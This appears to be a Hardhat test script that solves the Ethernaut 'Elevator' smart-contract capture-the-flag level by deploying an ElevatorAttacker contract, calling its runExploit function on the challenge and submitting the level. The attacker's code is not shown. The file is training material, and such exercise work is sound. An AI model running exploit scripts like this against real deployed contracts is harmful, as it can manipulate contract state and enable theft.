import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Elevator`);
  const challengeAddress = await createChallenge(
    `0xaB4F3F2644060b2D960b0d88F0a42d1D27484687`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  const attackerFactory = await ethers.getContractFactory('ElevatorAttacker')
  let attacker = await attackerFactory.connect(eoa).deploy()

  await attacker.connect(eoa).runExploit(challenge.address)
  console.log(await challenge.top())

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
